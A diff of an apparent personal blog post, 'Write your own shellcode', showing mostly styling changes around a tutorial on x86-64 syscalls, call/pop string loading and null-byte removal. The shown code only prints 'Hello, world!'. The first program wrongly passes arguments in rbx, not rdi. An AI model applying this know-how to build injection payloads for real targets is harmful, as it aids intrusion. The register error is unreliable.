@@ -1,9 +1,15 @@
-<!DOCTYPE html><html lang="en"> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/svg+xml" href="/me.svg"><meta name="generator" content="Astro v5.12.7"><!-- Canonical URL --><link rel="canonical" href="https://danielorihuela.dev/blog/write-your-own-shellcode/"><!-- Primary Meta Tags --><title>Write your own shellcode</title><meta name="title" content="Write your own shellcode"><meta name="description" content="Ever dreamed about being a hacker and writing your own exploits? Learn the art of crafting shellcodes and uncover their secrets."><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://danielorihuela.dev/blog/write-your-own-shellcode/"><meta property="og:title" content="Write your own shellcode"><meta property="og:description" content="Ever dreamed about being a hacker and writing your own exploits? Learn the art of crafting shellcodes and uncover their secrets."><meta property="og:image" content="https://danielorihuela.dev/_astro/write-shellcode.BPuIU2Up.png"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://danielorihuela.dev/blog/write-your-own-shellcode/"><meta property="twitter:title" content="Write your own shellcode"><meta property="twitter:description" content="Ever dreamed about being a hacker and writing your own exploits? Learn the art of crafting shellcodes and uncover their secrets."><meta property="twitter:image" content="https://danielorihuela.dev/_astro/write-shellcode.BPuIU2Up.png"><!-- RSS --><link rel="alternate" type="application/rss+xml" title="Daniel Orihuela" href="https://danielorihuela.dev/feed.xml"><link rel="stylesheet" href="https://danielorihuela.dev/_astro/about.BFXsSlim.css">
-<link rel="stylesheet" href="https://danielorihuela.dev/_astro/_slug_.D6TxBt9f.css">
-<style>img{margin:0 auto}div+h1{margin-top:0}h1,h2,h3,h4,h5,h6{margin-top:1em}
-</style></head> <body class="bg-black bg-gradient-to-b from-black to-gray-900w-screen bg-black bg-gradient-to-b from-black to-gray-900"> <header class="px-4 py-0"> <nav class="fixed top-0 left-0 right-0 z-50 transition-all duration-500 bg-black/90 backdrop-blur-md border-b border-royalPurple/50"> <div class="max-w-7xl mx-auto px-6 lg:px-8"> <div class="flex items-center justify-between h-20">  <a href="/" class="text-2xl font-bold text-white hover:text-cyan-400 transition-colors duration-300"> <span class="text-royalPurple">&lt;</span>
-DO
-<span class="text-royalPurple">/&gt;</span> </a>  <div class="hidden md:flex items-center space-x-8"> <a href="/" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> Home <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a><a href="/about/" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> About <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a><a href="/blog/" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> Blog <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a><a href="/open-source/" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> Open Source <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a> </div>  <button id="mobile-menu-button" class="md:hidden text-white hover:text-cyan-400 transition-colors duration-300"> <svg id="menu-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" class="w-6 h-6"> <path id="menu-path" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16m-7 6h7"></path> </svg> </button> </div>  <div id="mobile-menu" class="md:hidden transition-all duration-300 overflow-hidden max-h-0 opacity-0"> <div class="py-4 space-y-2 bg-black/95 backdrop-blur-md rounded-lg mt-2 border border-purple-900/30"> <a href="/" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> Home </a><a href="/about/" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> About </a><a href="/blog/" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> Blog </a><a href="/open-source/" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> Open Source </a> </div> </div> </div> </nav> <script type="module">document.addEventListener("DOMContentLoaded",()=>{const n=document.getElementById("mobile-menu-button"),e=document.getElementById("menu-path");!n||!e||n.addEventListener("click",()=>{const t=document.getElementById("mobile-menu");t&&(t.classList.contains("max-h-0")?(t.classList.remove("max-h-0","opacity-0"),t.classList.add("max-h-96","opacity-100"),e.setAttribute("d","M6 18L18 6M6 6l12 12")):(t.classList.remove("max-h-96","opacity-100"),t.classList.add("max-h-0","opacity-0"),e.setAttribute("d","M4 6h16M4 12h16m-7 6h7")))})});</script> </header> <article class="my-32"> <div class="w-[80ch] max-w-full m-auto text-[#d3d3d3] bg-[#222222] rounded-2xl p-8 lg:p-12 border border-gray-600/30 shadow-2xl prose prose-xl prose-invert max-w-none"> <div class="w-96 max-w-full m-auto"> <img src="https://danielorihuela.dev/_astro/write-shellcode.BPuIU2Up_24WnSq.webp" alt loading="lazy" decoding="async" fetchpriority="auto" width="1024" height="1024" class="rounded-xl shadow-ba"> </div> <div class="py-4 text-center leading-none"> <div class="mb-2 text-[#ffffff]"> <time datetime="2024-10-19T00:00:00.000Z"> Oct 19, 2024 </time> </div> <h1 class="font-[Iceland]"> Write your own shellcode </h1> <hr> </div>  <ul>
+<!DOCTYPE html><html lang="en"> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/svg+xml" href="/me.svg"><meta name="generator" content="Astro v6.1.10"><!-- Google Fonts --><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,300;0,400;0,500;0,600;0,700;1,400&family=Share+Tech+Mono&display=swap" rel="stylesheet"><!-- Canonical URL --><link rel="canonical" href="https://danielorihuela.dev/blog/write-your-own-shellcode/"><!-- Primary Meta Tags --><title>Write your own shellcode</title><meta name="title" content="Write your own shellcode"><meta name="description" content="Ever dreamed about being a hacker and writing your own exploits? Learn the art of crafting shellcodes and uncover their secrets."><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://danielorihuela.dev/blog/write-your-own-shellcode/"><meta property="og:title" content="Write your own shellcode"><meta property="og:description" content="Ever dreamed about being a hacker and writing your own exploits? Learn the art of crafting shellcodes and uncover their secrets."><meta property="og:image" content="https://danielorihuela.dev/_astro/write-shellcode.BPuIU2Up.png"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://danielorihuela.dev/blog/write-your-own-shellcode/"><meta property="twitter:title" content="Write your own shellcode"><meta property="twitter:description" content="Ever dreamed about being a hacker and writing your own exploits? Learn the art of crafting shellcodes and uncover their secrets."><meta property="twitter:image" content="https://danielorihuela.dev/_astro/write-shellcode.BPuIU2Up.png"><!-- RSS --><link rel="alternate" type="application/rss+xml" title="Daniel Orihuela" href="https://danielorihuela.dev/feed.xml"><style>:root{--accent: #00d4ff;--accent-dim: #0098b8;--accent-glow: #00d4ff66;--accent-glow-dim: #00d4ff05;--accent-extra-dim: #00d4ff0d;--magenta: #ff003c;--bg-dark: #08090e;--bg-panel: #11131c;--border: #1c2035;--text-body: #b0bec5;--text-bright: #e0e6ed;--text-dim: #525e78;--btn-bg-hover: #00d4ff1a;--btn-border-hover: #00d4ff4d}*,*:before,*:after{box-sizing:border-box}html{scroll-behavior:smooth}body{margin:0;background-color:var(--bg-dark);color:var(--text-body);font-family:IBM Plex Mono,monospace;line-height:1.7}::selection{background:#00d4ff40}::-webkit-scrollbar{width:6px}::-webkit-scrollbar-track{background:var(--bg-dark)}::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}::-webkit-scrollbar-thumb:hover{background:var(--accent)}h1,h2,h3,h4,h5,h6{margin:0 0 .5rem;line-height:1.2;color:var(--text-bright);font-family:Share Tech Mono,monospace;font-weight:400;letter-spacing:.02em}strong,b{color:var(--text-bright)}a{color:var(--accent);text-decoration:none}nav[data-astro-cid-3ef6ksr2]{position:fixed;inset:0 0 auto;z-index:50;background:#08090ef2;backdrop-filter:blur(4px);border-bottom:1px solid var(--border);padding:0 1rem;font-family:Share Tech Mono,monospace}.nav-content[data-astro-cid-3ef6ksr2]{display:flex;align-items:center;justify-content:space-between;height:3.5rem}.logo[data-astro-cid-3ef6ksr2]{font-size:.875rem;span{color:var(--text-bright)}}.nav-links[data-astro-cid-3ef6ksr2]{&.desktop{display:none;gap:.25rem;@media(min-width:640px){display:flex}}&.mobile{display:flex;flex-direction:column;max-height:0;overflow:hidden;transition:.5s ease;&.open{max-height:24rem;opacity:1;padding-bottom:1rem;@media(min-width:640px){display:none}}.link{padding:.875rem 1rem;border-left:2px solid transparent}.link:hover,.link.active{border-left-color:var(--accent)}}}.link[data-astro-cid-3ef6ksr2]{font-size:.75rem;text-transform:uppercase;color:var(--text-body);opacity:.6;transition:all .3s ease;padding:.375rem .75rem;letter-spacing:.05em;border:1px solid transparent;&:hover{color:var(--accent);background-color:var(--accent-extra-dim);opacity:1}&.active{color:var(--accent);background-color:var(--accent-glow-dim);border-color:var(--accent);border-radius:.25rem;opacity:1}}#menu-toggle[data-astro-cid-3ef6ksr2]{background:none;border:none;color:var(--text-body);font:.75rem Share Tech Mono,monospace;text-transform:uppercase;cursor:pointer;@media(min-width:640px){display:none}}footer[data-astro-cid-sz7xmlte]{border-top:1px solid var(--border);padding:1rem 0}.container[data-astro-cid-sz7xmlte]{max-width:90vw;margin:0 auto;display:flex;justify-content:space-between;font-size:.625rem;text-transform:uppercase;letter-spacing:.1em;@media(min-width:640px){max-width:60vw}}.group[data-astro-cid-sz7xmlte]{display:flex;gap:1.5rem}.link[data-astro-cid-sz7xmlte]{display:flex;align-items:center;gap:.375rem;color:var(--text-body);&:hover{color:var(--text-bright);.indicator{opacity:1}}}.indicator[data-astro-cid-sz7xmlte]{width:.375rem;height:.625rem;background:var(--accent);opacity:0;transition:opacity .2s ease}.status[data-astro-cid-sz7xmlte]{display:flex;align-items:center;gap:.625rem;pointer-events:none}.light[data-astro-cid-sz7xmlte]{position:relative;width:.375rem;height:.375rem;border-radius:50%;background:var(--accent);&:after{content:"";position:absolute;inset:0;border-radius:inherit;background:inherit;animation:ping 1s cubic-bezier(0,0,.2,1) infinite}}@keyframes ping{75%,to{transform:scale(2.5);opacity:0}}
+.terminal-window[data-astro-cid-u23vcbo2]{background:var(--bg-panel);border:1px solid var(--border);border-radius:4px;overflow:hidden}
+</style>
+<link rel="stylesheet" href="https://danielorihuela.dev/_astro/_..CfrG-3Ag.css"></head> <body> <header data-astro-cid-3ef6ksr2> <nav data-astro-cid-3ef6ksr2> <div class="nav-content" data-astro-cid-3ef6ksr2> <a href="/" class="logo" data-astro-cid-3ef6ksr2>danielorihuela<span data-astro-cid-3ef6ksr2>@dev:~</span></a> <div class="nav-links desktop" data-astro-cid-3ef6ksr2> <a href="/" class="link" data-astro-cid-3ef6ksr2>
+./blog </a><a href="/open-source/" class="link" data-astro-cid-3ef6ksr2>
+./contrib </a> </div> <button id="menu-toggle" data-astro-cid-3ef6ksr2>[menu]</button> </div> <div id="mobile-menu" class="nav-links mobile" data-astro-cid-3ef6ksr2> <a href="/" class="link" data-astro-cid-3ef6ksr2>
+- blog </a><a href="/open-source/" class="link" data-astro-cid-3ef6ksr2>
+- contrib </a> </div> </nav> <script type="module">const e=document.getElementById("menu-toggle"),n=document.getElementById("mobile-menu");e?.addEventListener("click",()=>{const t=n?.classList.toggle("open");e.textContent=t?"[close]":"[menu]"});</script> </header>  <article> <div class="post-wrapper"> <div class="terminal-window" data-astro-cid-u23vcbo2>  <div class="post-metadata"> <div> <span> DATE:
+<span class="metadata-value"> 2024-10-19 </span> </span><span> | SIZE:
+<span class="metadata-value"> 10.9 KB </span> </span><span> | LINES:
+<span class="metadata-value"> AUTO </span> </span><span> | ENCODING:
+<span class="metadata-value"> UTF-8 </span> </span> </div> </div> <div class="post-content-wrapper"> <h1 class="post-title"> Write your own shellcode </h1> <img src="https://danielorihuela.dev/_astro/write-shellcode.BPuIU2Up_UHqHP.webp" alt loading="lazy" decoding="async" width="1024" height="1024" class="post-image"> <div class="post-content">  <ul>
 <li><a href="#whats-a-shellcode">What’s a shellcode?</a></li>
 <li><a href="#building-a-shellcode">Building a shellcode</a>
 <ul>
@@ -46,47 +52,47 @@ resources where you can learn about it.</p>
 architecture. You can get the information from the system. For example,
 my 64-bit Linux machine has the file
 <code>/usr/include/x86_64-linux-gnu/asm/unistd_64.h</code> with the information.</p>
-<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#FF79C6">#ifndef</span><span style="color:#50FA7B"> _ASM_UNISTD_64_H</span></span>
-<span class="line"><span style="color:#FF79C6">#define</span><span style="color:#50FA7B"> _ASM_UNISTD_64_H</span></span>
+<pre class="astro-code poimandres" style="background-color:#1b1e28;color:#a6accd; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#A6ACCD">#ifndef </span><span style="color:#ADD7FF">_ASM_UNISTD_64_H</span></span>
+<span class="line"><span style="color:#A6ACCD">#define </span><span style="color:#ADD7FF">_ASM_UNISTD_64_H</span></span>
 <span class="line"></span>
-<span class="line"><span style="color:#FF79C6">#define</span><span style="color:#50FA7B"> __NR_read</span><span style="color:#BD93F9"> 0</span></span>
-<span class="line"><span style="color:#FF79C6">#define</span><span style="color:#50FA7B"> __NR_write</span><span style="color:#BD93F9"> 1</span></span>
-<span class="line"><span style="color:#FF79C6">#define</span><span style="color:#50FA7B"> __NR_open</span><span style="color:#BD93F9"> 2</span></span>
-<span class="line"><span style="color:#FF79C6">#define</span><span style="color:#50FA7B"> __NR_close</span><span style="color:#BD93F9"> 3</span></span>
-<span class="line"><span style="color:#FF79C6">#define</span><span style="color:#50FA7B"> __NR_stat</span><span style="color:#BD93F9"> 4</span></span></code></pre>
+<span class="line"><span style="color:#A6ACCD">#define </span><span style="color:#ADD7FF">__NR_read</span><span style="color:#5DE4C7"> 0</span></span>
+<span class="line"><span style="color:#A6ACCD">#define </span><span style="color:#ADD7FF">__NR_write</span><span style="color:#5DE4C7"> 1</span></span>
+<span class="line"><span style="color:#A6ACCD">#define </span><span style="color:#ADD7FF">__NR_open</span><span style="color:#5DE4C7"> 2</span></span>
+<span class="line"><span style="color:#A6ACCD">#define </span><span style="color:#ADD7FF">__NR_close</span><span style="color:#5DE4C7"> 3</span></span>
+<span class="line"><span style="color:#A6ACCD">#define </span><span style="color:#ADD7FF">__NR_stat</span><span style="color:#5DE4C7"> 4</span></span></code></pre>
 <p>Alternatively, you can search for that information on the Internet, for
 example,
 <a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</a> or
 <a href="https://j00ru.vexillium.org/syscalls/nt/64/">https://j00ru.vexillium.org/syscalls/nt/64/</a>.</p>
 <p>Let’s start writing a simple program to print to the stdout.</p>
 <h2 id="hello-world-assembly">Hello world assembly</h2>
-<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="asm"><code><span class="line"><span style="color:#F8F8F2">BITS </span><span style="color:#BD93F9">64</span><span style="color:#6272A4"> ; Define target architecture bits</span></span>
+<pre class="astro-code poimandres" style="background-color:#1b1e28;color:#a6accd; overflow-x: auto;" tabindex="0" data-language="asm"><code><span class="line"><span style="color:#A6ACCD">BITS </span><span style="color:#5DE4C7">64</span><span style="color:#767C9DB0;font-style:italic"> ; Define target architecture bits</span></span>
 <span class="line"></span>
-<span class="line"><span style="color:#F8F8F2">section .data </span><span style="color:#6272A4">; Data segment</span></span>
-<span class="line"><span style="color:#F8F8F2">msg </span><span style="color:#FF79C6">db</span><span style="color:#F8F8F2"> "Hello, world!", </span><span style="color:#BD93F9">0x0a</span><span style="color:#6272A4">; String with new line char</span></span>
+<span class="line"><span style="color:#91B4D5">section .data</span><span style="color:#767C9DB0;font-style:italic"> ; Data segment</span></span>
+<span class="line"><span style="color:#A6ACCD">msg </span><span style="color:#91B4D5">db</span><span style="color:#A6ACCD"> "Hello, world!", </span><span style="color:#5DE4C7">0x0a</span><span style="color:#767C9DB0;font-style:italic">; String with new line char</span></span>
 <span class="line"></span>
-<span class="line"><span style="color:#F8F8F2">section .text </span><span style="color:#6272A4">; Text segment</span></span>
-<span class="line"><span style="color:#F8F8F2">global _start</span><span style="color:#6272A4">; Default entry point for ELF linking</span></span>
+<span class="line"><span style="color:#91B4D5">section .text</span><span style="color:#767C9DB0;font-style:italic"> ; Text segment</span></span>
+<span class="line"><span style="color:#A6ACCD">global _start</span><span style="color:#767C9DB0;font-style:italic">; Default entry point for ELF linking</span></span>
 <span class="line"></span>
-<span class="line"><span style="color:#50FA7B">_start:</span></span>
+<span class="line"><span style="color:#ADD7FF">_start</span><span style="color:#A6ACCD">:</span></span>
 <span class="line"></span>
-<span class="line"><span style="color:#6272A4">; write</span></span>
-<span class="line"><span style="color:#FF79C6">mov</span><span style="color:#BD93F9"> rax</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">1</span><span style="color:#6272A4"> ; Specify write syscall</span></span>
-<span class="line"><span style="color:#FF79C6">mov</span><span style="color:#BD93F9"> rbx</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">1</span><span style="color:#6272A4"> ; Specify stdout by putting 1 into rbx</span></span>
-<span class="line"><span style="color:#FF79C6">mov</span><span style="color:#BD93F9"> rsi</span><span style="color:#F8F8F2">, msg </span><span style="color:#6272A4">; Put the address of the string into rsi</span></span>
-<span class="line"><span style="color:#FF79C6">mov</span><span style="color:#BD93F9"> rdx</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">14</span><span style="color:#6272A4"> ; Put the length of the string into rdx</span></span>
-<span class="line"><span style="color:#FF79C6">syscall</span><span style="color:#6272A4"> ; Execute the system call</span></span>
+<span class="line"><span style="color:#767C9DB0;font-style:italic">; write</span></span>
+<span class="line"><span style="color:#91B4D5">mov</span><span style="color:#5DE4C7"> rax</span><span style="color:#A6ACCD">, </span><span style="color:#5DE4C7">1</span><span style="color:#767C9DB0;font-style:italic"> ; Specify write syscall</span></span>
+<span class="line"><span style="color:#91B4D5">mov</span><span style="color:#5DE4C7"> rbx</span><span style="color:#A6ACCD">, </span><span style="color:#5DE4C7">1</span><span style="color:#767C9DB0;font-style:italic"> ; Specify stdout by putting 1 into rbx</span></span>
+<span class="line"><span style="color:#91B4D5">mov</span><span style="color:#5DE4C7"> rsi</span><span style="color:#A6ACCD">, msg </span><span style="color:#767C9DB0;font-style:italic">; Put the address of the string into rsi</span></span>
+<span class="line"><span style="color:#91B4D5">mov</span><span style="color:#5DE4C7"> rdx</span><span style="color:#A6ACCD">, </span><span style="color:#5DE4C7">14</span><span style="color:#767C9DB0;font-style:italic"> ; Put the length of the string into rdx</span></span>
+<span class="line"><span style="color:#91B4D5">syscall</span><span style="color:#767C9DB0;font-style:italic"> ; Execute the system call</span></span>
 <span class="line"></span>
-<span class="line"><span style="color:#6272A4">; exit</span></span>
-<span class="line"><span style="color:#FF79C6">mov</span><span style="color:#BD93F9"> rax</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">60</span><span style="color:#6272A4"> ; Specify exit syscall</span></span>
-<span class="line"><span style="color:#FF79C6">mov</span><span style="color:#BD93F9"> rbx</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">0</span><span style="color:#6272A4"> ; Exit with success</span></span>
-<span class="line"><span style="color:#FF79C6">syscall</span><span style="color:#6272A4"> ; Execute the system call</span></span></code></pre>
+<span class="line"><span style="color:#767C9DB0;font-style:italic">; exit</span></span>
+<span class="line"><span style="color:#91B4D5">mov</span><span style="color:#5DE4C7"> rax</span><span style="color:#A6ACCD">, </span><span style="color:#5DE4C7">60</span><span style="color:#767C9DB0;font-style:italic"> ; Specify exit syscall</span></span>
+<span class="line"><span style="color:#91B4D5">mov</span><span style="color:#5DE4C7"> rbx</span><span style="color:#A6ACCD">, </span><span style="color:#5DE4C7">0</span><span style="color:#767C9DB0;font-style:italic"> ; Exit with success</span></span>
+<span class="line"><span style="color:#91B4D5">syscall</span><span style="color:#767C9DB0;font-style:italic"> ; Execute the system call</span></span></code></pre>
 <p>The program is simple. We define the target architecture bits, create a
 static string, and print it into stdout. Assembling, linking, and
 executing the binary is also very simple.</p>
-<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">nasm</span><span style="color:#BD93F9"> -f</span><span style="color:#F1FA8C"> elf64</span><span style="color:#F1FA8C"> helloworld.asm</span></span>
-<span class="line"><span style="color:#50FA7B">ld</span><span style="color:#F1FA8C"> helloworld.o</span></span>
-<span class="line"><span style="color:#50FA7B">./a.out</span></span></code></pre>
+<pre class="astro-code poimandres" style="background-color:#1b1e28;color:#a6accd; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#91B4D5">nasm</span><span style="color:#ADD7FF"> -f</span><span style="color:#ADD7FF"> elf64</span><span style="color:#ADD7FF"> helloworld.asm</span></span>
+<span class="line"><span style="color:#91B4D5">ld</span><span style="color:#ADD7FF"> helloworld.o</span></span>
+<span class="line"><span style="color:#91B4D5">./a.out</span></span></code></pre>
 <p>See how it works and experiment a bit.</p>
 <p>Taking that program as a basis, we will now see the different
 restrictions that we have to build a fully functional shellcode.</p>
@@ -102,25 +108,25 @@ address. We can misuse that in assembly to load a string. The idea is to
 place the string directly after a call instruction. That way the return
 address of the stack will match the address of the string and we will be
 able to retrieve it inside the function.</p>
-<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="asm"><code><span class="line"><span style="color:#F8F8F2">BITS </span><span style="color:#BD93F9">64</span></span>
+<pre class="astro-code poimandres" style="background-color:#1b1e28;color:#a6accd; overflow-x: auto;" tabindex="0" data-language="asm"><code><span class="line"><span style="color:#A6ACCD">BITS </span><span style="color:#5DE4C7">64</span></span>
 <span class="line"></span>
-<span class="line"><span style="color:#FF79C6">call</span><span style="color:#F8F8F2"> below</span></span>
-<span class="line"><span style="color:#FF79C6">db</span><span style="color:#F8F8F2"> "Hello, world!", </span><span style="color:#BD93F9">0x0a</span></span>
+<span class="line"><span style="color:#91B4D5">call</span><span style="color:#A6ACCD"> below</span></span>
+<span class="line"><span style="color:#91B4D5">db</span><span style="color:#A6ACCD"> "Hello, world!", </span><span style="color:#5DE4C7">0x0a</span></span>
 <span class="line"></span>
-<span class="line"><span style="color:#50FA7B">below:</span></span>
-<span class="line"><span style="color:#6272A4">; write</span></span>
-<span class="line"><span style="color:#FF79C6">mov</span><span style="color:#BD93F9"> rax</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">1</span></span>
-<span class="line"><span style="color:#FF79C6">mov</span><span style="color:#BD93F9"> rdi</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">1</span></span>
-<span class="line"><span style="color:#6272A4">; Pop the value from the return address </span></span>
-<span class="line"><span style="color:#6272A4">; and store it into the register</span></span>
-<span class="line"><span style="color:#FF79C6">pop</span><span style="color:#BD93F9"> rsi</span><span style="color:#F8F8F2"> </span></span>
-<span class="line"><span style="color:#FF79C6">mov</span><span style="color:#BD93F9"> rdx</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">14</span></span>
-<span class="line"><span style="color:#FF79C6">syscall</span></span>
+<span class="line"><span style="color:#ADD7FF">below</span><span style="color:#A6ACCD">:</span></span>
+<span class="line"><span style="color:#767C9DB0;font-style:italic">; write</span></span>
+<span class="line"><span style="color:#91B4D5">mov</span><span style="color:#5DE4C7"> rax</span><span style="color:#A6ACCD">, </span><span style="color:#5DE4C7">1</span></span>
+<span class="line"><span style="color:#91B4D5">mov</span><span style="color:#5DE4C7"> rdi</span><span style="color:#A6ACCD">, </span><span style="color:#5DE4C7">1</span></span>
+<span class="line"><span style="color:#767C9DB0;font-style:italic">; Pop the value from the return address </span></span>
+<span class="line"><span style="color:#767C9DB0;font-style:italic">; and store it into the register</span></span>
+<span class="line"><span style="color:#91B4D5">pop</span><span style="color:#5DE4C7"> rsi</span><span style="color:#A6ACCD"> </span></span>
+<span class="line"><span style="color:#91B4D5">mov</span><span style="color:#5DE4C7"> rdx</span><span style="color:#A6ACCD">, </span><span style="color:#5DE4C7">14</span></span>
+<span class="line"><span style="color:#91B4D5">syscall</span></span>
 <span class="line"></span>
-<span class="line"><span style="color:#6272A4">; exit</span></span>
-<span class="line"><span style="color:#FF79C6">mov</span><span style="color:#BD93F9"> rax</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">60</span></span>
-<span class="line"><span style="color:#FF79C6">mov</span><span style="color:#BD93F9"> rdi</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">0</span></span>
-<span class="line"><span style="color:#FF79C6">syscall</span></span></code></pre>
+<span class="line"><span style="color:#767C9DB0;font-style:italic">; exit</span></span>
+<span class="line"><span style="color:#91B4D5">mov</span><span style="color:#5DE4C7"> rax</span><span style="color:#A6ACCD">, </span><span style="color:#5DE4C7">60</span></span>
+<span class="line"><span style="color:#91B4D5">mov</span><span style="color:#5DE4C7"> rdi</span><span style="color:#A6ACCD">, </span><span style="color:#5DE4C7">0</span></span>
+<span class="line"><span style="color:#91B4D5">syscall</span></span></code></pre>
 <p>Try it out and experiment with it.</p>
 <p>In some situations that’s the only technique you will need to inject a
 shellcode. However, there are some occasions where this may fall short
@@ -131,9 +137,9 @@ remove the null bytes.</p>
 <h2 id="no-null-bytes">No null bytes</h2>
 <p>There are different techniques to remove null bytes. Let’s see our
 starting point.</p>
-<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>nasm helloworld.asm</span></span>
+<pre class="astro-code poimandres" style="background-color:#1b1e28;color:#a6accd; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>nasm helloworld.asm</span></span>
 <span class="line"><span>hexdump -C helloword</span></span></code></pre>
-<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="715" height="115" src="https://danielorihuela.dev/_astro/hexdump-t0.C5YlI_yk_GWobc.webp" ></p>
+<p><img  loading="lazy" decoding="async"  width="715" height="115" src="https://danielorihuela.dev/_astro/hexdump-t0.C5YlI_yk_ejA47.webp" ></p>
 <p>Notice how many <code>00</code> are there. These are the null bytes.</p>
 <h3 id="jump-to-the-end-and-back">Jump to the end and back</h3>
 <p><code>call</code> instructions allow for “long” jumps. Using it for “small” jumps
@@ -145,27 +151,27 @@ number to the <code>call</code> instruction, the value will be padded with <code
 instead of null bytes. A standard implementation of this solution
 consists of jumping to the end of the assembly program to a <code>call</code>
 instruction that will jump back to a function.</p>
-<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="asm"><code><span class="line"><span style="color:#F8F8F2">BITS </span><span style="color:#BD93F9">64</span></span>
+<pre class="astro-code poimandres" style="background-color:#1b1e28;color:#a6accd; overflow-x: auto;" tabindex="0" data-language="asm"><code><span class="line"><span style="color:#A6ACCD">BITS </span><span style="color:#5DE4C7">64</span></span>
 <span class="line"></span>
-<span class="line"><span style="color:#FF79C6">jmp</span><span style="color:#F8F8F2"> short bottom</span></span>
+<span class="line"><span style="color:#91B4D5">jmp</span><span style="color:#A6ACCD"> short bottom</span></span>
 <span class="line"></span>
-<span class="line"><span style="color:#50FA7B">above:</span></span>
-<span class="line"><span style="color:#6272A4">; write</span></span>
-<span class="line"><span style="color:#FF79C6">mov</span><span style="color:#BD93F9"> rax</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">1</span></span>
-<span class="line"><span style="color:#FF79C6">mov</span><span style="color:#BD93F9"> rdi</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">1</span></span>
-<span class="line"><span style="color:#FF79C6">pop</span><span style="color:#BD93F9"> rsi</span></span>
-<span class="line"><span style="color:#FF79C6">mov</span><span style="color:#BD93F9"> rdx</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">14</span></span>
-<span class="line"><span style="color:#FF79C6">syscall</span></span>
+<span class="line"><span style="color:#ADD7FF">above</span><span style="color:#A6ACCD">:</span></span>
+<span class="line"><span style="color:#767C9DB0;font-style:italic">; write</span></span>
+<span class="line"><span style="color:#91B4D5">mov</span><span style="color:#5DE4C7"> rax</span><span style="color:#A6ACCD">, </span><span style="color:#5DE4C7">1</span></span>
+<span class="line"><span style="color:#91B4D5">mov</span><span style="color:#5DE4C7"> rdi</span><span style="color:#A6ACCD">, </span><span style="color:#5DE4C7">1</span></span>
+<span class="line"><span style="color:#91B4D5">pop</span><span style="color:#5DE4C7"> rsi</span></span>
+<span class="line"><span style="color:#91B4D5">mov</span><span style="color:#5DE4C7"> rdx</span><span style="color:#A6ACCD">, </span><span style="color:#5DE4C7">14</span></span>
+<span class="line"><span style="color:#91B4D5">syscall</span></span>
 <span class="line"></span>
-<span class="line"><span style="color:#6272A4">; exit</span></span>
